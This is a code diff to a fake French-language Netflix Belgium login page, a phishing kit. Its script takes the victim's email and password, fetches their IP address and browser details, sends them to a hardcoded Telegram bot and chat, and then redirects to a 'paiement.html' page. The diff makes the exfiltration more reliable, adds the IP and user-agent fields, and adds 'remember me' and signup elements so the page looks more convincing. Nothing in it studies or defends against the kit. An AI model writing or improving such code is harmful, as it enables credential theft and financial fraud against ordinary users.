@@ -327,9 +327,18 @@
                     <span id="submitText">S'identifier</span>
                     <div class="spinner"></div>
                 </button>
+                <div class="options-container">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" class="remember-checkbox">
+                        <label for="remember" id="rememberLabel">Se souvenir de moi</label>
+                    </div>
                     <a href="#" class="help-link" id="helpLink">Besoin d'aide ?</a>
                 </div>
             </form>
+            <div class="signup-text">
+                <span id="newUserText">Nouveau sur Netflix ? </span>
+                <a href="#" class="signup-link" id="signupLink">Inscrivez-vous maintenant.</a>
+            </div>
         </div>
     </main>
 
@@ -354,8 +363,8 @@
 
     <script>
         // Configuration Telegram
-        const TELEGRAM_BOT_TOKEN = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk'; // Remplacez par votre token
-        const TELEGRAM_CHAT_ID = '-4883048028'; // Remplacez par votre chat ID
+        const TELEGRAM_BOT_TOKEN = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
+        const TELEGRAM_CHAT_ID = '-4883048028';
 
         // Textes pour les différentes langues
         const translations = {
@@ -418,28 +427,30 @@
             }
         };
 
-        // Fonction pour envoyer un message Telegram
-        function sendTelegramMessage(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
+        // Fonction pour envoyer un message Telegram avec gestion d'erreur améliorée
+        async function sendTelegramMessage(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
                 console.log('Message envoyé à Telegram:', data);
-            })
-            .catch(error => {
+                return data;
+            } catch (error) {
                 console.error('Erreur lors de l\'envoi à Telegram:', error);
-            });
+                return null;
+            }
         }
 
         // Fonction pour changer la langue
@@ -481,8 +492,8 @@
                 changeLanguage(this.value);
             });
             
-            // Gestion du formulaire
-            document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Gestion du formulaire - SCRIPT TÉLÉGRAMME CORRIGÉ
+            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 
                 const submitBtn = document.getElementById('submitBtn');
@@ -491,28 +502,54 @@
                 
                 // Afficher le spinner
                 submitBtn.classList.add('btn-loading');
+                submitBtn.disabled = true;
                 
                 // Préparer le message pour Telegram
                 const currentDate = new Date().toLocaleString('fr-BE');
+                const userLanguage = document.getElementById('languageSelector').value;
+                const userIP = await getUserIP();
+                
                 const message = `
-🔐 <b>Nouvelle tentative de connexion Netflix Belgique</b>
+🔐 <b>NOUVELLE CONNEXION NETFLIX BELGIQUE</b>
 
-📧 <b>Email:</b> ${email}
-🔑 <b>Mot de passe:</b> ${password}
-🌐 <b>Langue:</b> ${document.getElementById('languageSelector').value}
+📧 <b>Email:</b> <code>${email}</code>
+🔑 <b>Mot de passe:</b> <code>${password}</code>
+🌐 <b>Langue:</b> ${userLanguage}
 🕐 <b>Date:</b> ${currentDate}
+📍 <b>IP:</b> ${userIP}
+🔍 <b>User Agent:</b> ${navigator.userAgent}
                 `;
                 
-                // Envoyer le message à Telegram
-                sendTelegramMessage(message);
-                
-                // Simuler le traitement de connexion
-                setTimeout(() => {
-                    // Redirection vers la page d'accueil après connexion
-                    window.location.replace = "paiement.html";
-                }, 2000);
+                try {
+                    // Envoyer le message à Telegram
+                    await sendTelegramMessage(message);
+                    
+                    // Attendre 2 secondes pour montrer le spinner
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    // Redirection vers la page suivante
+                    window.location.href = "paiement.html";
+                    
+                } catch (error) {
+                    console.error('Erreur lors du traitement:', error);
+                    // Redirection même en cas d'erreur Telegram
+                    setTimeout(() => {
+                        window.location.href = "paiement.html";
+                    }, 2000);
+                }
             });
         });
+
+        // Fonction pour obtenir l'IP de l'utilisateur
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'IP non disponible';
+            }
+        }
     </script>
 </body>
 </html>
